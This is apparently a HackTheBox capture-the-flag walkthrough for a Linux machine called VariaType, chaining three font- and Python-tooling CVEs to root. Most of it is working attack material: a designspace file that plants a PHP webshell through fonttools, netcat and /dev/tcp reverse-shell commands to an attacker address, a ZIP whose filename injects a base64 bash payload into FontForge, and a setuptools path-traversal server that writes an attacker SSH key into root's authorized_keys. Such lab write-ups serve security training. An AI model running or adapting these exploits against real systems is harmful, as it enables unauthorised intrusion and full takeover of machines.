# VariaType — HackTheBox Writeup
**Difficulty:** Medium | **OS:** Linux

---

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Foothold](#foothold)
- [Lateral Movement](#lateral-movement--www-data--sxxxx)
- [Privilege Escalation](#privilege-escalation--sxxxx--root)
- [Flags](#flags)

---

## Reconnaissance

### Port Scan
```bash
nmap -Pn -sC -sV -p 22,80 10.129.xxx.xx
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx/1.22.1
```

### Virtual Host Discovery
```bash
echo "10.129.xxx.xx variatype.htb portal.variatype.htb" >> /etc/hosts
```

| Domain | Stack | Purpose |
|--------|-------|---------|
| `variatype.htb` | Python / Flask | Public variable font generator |
| `portal.variatype.htb` | PHP 8.2 / PHP-FPM | Internal font validation dashboard |

---

## Foothold

### 1. Exposed Git Repository

The portal subdomain had an accessible `.git/` directory. Dumped it with git-dumper:
```bash
git-dumper http://portal.variatype.htb/.git/ ./portal-repo/
cd portal-repo
git log -p
```

Commit history revealed hardcoded credentials:
```php
$USERS = [
    'gitbot' => 'Gxxxxt_xxxxxx_xxx5!'
];
```

### 2. Portal Login

Logged into `http://portal.variatype.htb` with `gitbot:Gxxxxt_xxxxxx_xxx5!`.

The dashboard listed recently generated font files served from `/files/`.

### 3. CVE-2025-66034 — fonttools varLib Arbitrary File Write + PHP Webshell

The main site's font generator at `/tools/variable-font-generator/process` processed `.designspace` XML files using the vulnerable `fonttools varLib` module.

**Two vulnerabilities chained:**
1. **Arbitrary file write** — the `filename` attribute in `<variable-font>` is unsanitized, allowing path traversal
2. **XML injection** — `<labelname>` CDATA content is injected directly into the output font file

**Step 1 — Create two minimal TTF source files:**

Save as `makefont.py`:
```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

fb = FontBuilder(1000, isTTF=True)
fb.setupGlyphOrder([".notdef", "space", "A"])
fb.setupCharacterMap({32: "space", 65: "A"})

pen = TTGlyphPen(None)
pen.moveTo((50, 0))
pen.lineTo((450, 0))
pen.lineTo((450, 700))
pen.lineTo((50, 700))
pen.endPath()
notdef = pen.glyph()

pen2 = TTGlyphPen(None)
space = pen2.glyph()

pen3 = TTGlyphPen(None)
pen3.moveTo((50, 0))
pen3.lineTo((550, 0))
pen3.lineTo((300, 700))
pen3.endPath()
a_glyph = pen3.glyph()

fb.setupGlyf({".notdef": notdef, "space": space, "A": a_glyph})
fb.setupHorizontalMetrics({".notdef": (500,0), "space": (250,0), "A": (600,0)})
fb.setupHorizontalHeader(ascent=800, descent=-200)
fb.setupNameTable({"familyName": "Test", "styleName": "Regular"})
fb.setupOS2(sTypoAscender=800, sTypoDescender=-200, sTypoLineGap=0, usWinAscent=800, usWinDescent=200)
fb.setupPost()
fb.setupHead(unitsPerEm=1000)
fb.font.save("/tmp/minimal.ttf")
```

Save as `makefont2.py` (same but `styleName: "Bold"`, save to `/tmp/minimal2.ttf`).
```bash
python3 makefont.py
python3 makefont2.py
```

**Step 2 — Craft malicious designspace:**

Save as `malicious2.designspace`:
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

**Step 3 — Upload and trigger:**
```bash
curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F 'designspace=@malicious2.designspace;type=application/octet-stream' \
  -F 'masters=@/tmp/minimal.ttf;filename=source-light.ttf;type=application/octet-stream' \
  -F 'masters=@/tmp/minimal2.ttf;filename=source-regular.ttf;type=application/octet-stream'
```

The Flask app saves output to `/var/www/portal.variatype.htb/public/files/` which nginx serves with PHP-FPM. The `shell.php` written there executes PHP.

**Step 4 — Verify RCE:**
```bash
curl -s -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4. Reverse Shell (www-data)

**Terminal 1 — Listener:**
```bash
nc -lvnp 4444
```

**Terminal 2 — Trigger:**
```bash
curl -s -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.xx.xx 4444 >/tmp/f"
```

**Stabilize:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement — www-data → steve

### CVE-2024-25081 — FontForge Command Injection via Filename

Found a cron job script at `/opt/process_client_submissions.bak` running as `steve`. It processed files from the uploads directory and passed filenames unsanitized into a FontForge shell command:
```bash
# Vulnerable code inside the script
fontforge -lang=py -c "
import fontforge
font = fontforge.open('$file')   # $file is unsanitized
"
```

**Step 1 — Create malicious ZIP with command-injection filename:**

Save as `make_exploit_zip.py`:
```python
import zipfile
import base64

payload = "bash -i >& /dev/tcp/10.10.xx.xx/5555 0>&1"
b64 = base64.b64encode(payload.encode()).decode()
fname = f"$(echo {b64}|base64 -d|bash).ttf"

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(fname, "dummy content")

print(f"Created exploit.zip with filename: {fname}")
```
```bash
python3 make_exploit_zip.py
```

**Step 2 — Serve and upload via webshell:**
```bash
# Kali - serve the file
python3 -m http.server 6666 &

# Upload via www-data webshell
curl -s -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=curl http://10.10.xx.xx:6666/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip"
```

**Step 3 — Wait for cron (~1-2 minutes):**
```bash
# Listener for sxxxx
nc -lvnp 5555
```

The cronjob extracts the ZIP and passes the malicious filename to FontForge, triggering the reverse shell as `sxxxx`.

---

## Privilege Escalation — sxxxx → root

### CVE-2025-47273 — setuptools PackageIndex Path Traversal
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script used `setuptools.PackageIndex().download(url, dest)`. In setuptools < 78.1.1, URL-encoded slashes (`%2F`) bypass path sanitization and are decoded to `/` after `os.path.join()` processes the destination, allowing arbitrary file write as root.

**Step 1 — Generate SSH keypair on Kali:**
```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
```

**Step 2 — Custom HTTP server** (required — standard `python3 -m http.server` decodes `%2F` and returns 404):

Save as `evil_server.py`:
```python
import http.server
import socketserver

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/tmp/rootkey.pub', 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, format, *args):
        print(f"Request: {self.path}")

with socketserver.TCPServer(('', 8888), Handler) as httpd:
    print("Serving on port 8888")
    httpd.serve_forever()
```
```bash
python3 evil_server.py &
```

**Step 3 — Trigger exploit from steve's shell:**
```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.xx.xx:8888/%2Froot%2F.ssh%2Fauthorized_keys'

# [INFO] Plugin installed at: /root/.ssh/authorized_keys
# [+] Plugin installed successfully.
```

**Step 4 — SSH as root:**
```bash
ssh -i /tmp/rootkey root@10.129.xxx.xx
```

---

## Flags

| Flag | Value |
|------|-------|
| `user.txt` | `<user flag>` |
| `root.txt` | `<root flag>` |

---

## Kill Chain
```
Nmap
  └─► variatype.htb + portal.variatype.htb
        └─► Git dump (.git/) → gitbot:Gxxxxt_xxxxxx_xxx5!
              └─► Portal login → /files/ PHP execution confirmed
                    └─► CVE-2025-66034 (fonttools) → shell.php → RCE as www-data
                          └─► CVE-2024-25081 (FontForge) → exploit.zip → RCE as sxxxx
                                └─► user.txt ✓
                                      └─► CVE-2025-47273 (setuptools) → authorized_keys → root
                                            └─► root.txt ✓
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `git-dumper` | Dump exposed .git repository |
| `curl` | Web requests / file upload |
| `fontTools` | Generate minimal TTF files |
| `netcat` | Reverse shell listener |
| `python3` | Custom HTTP server / exploit scripts |
| `ssh-keygen` | Generate root SSH keypair |

---

## CVEs Referenced

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2025-66034 | fonttools varLib | Arbitrary file write + XML injection → RCE |
| CVE-2024-25081 | FontForge | Command injection via malicious filename |
| CVE-2025-47273 | Python setuptools | Path traversal via %2F → arbitrary file write as root |
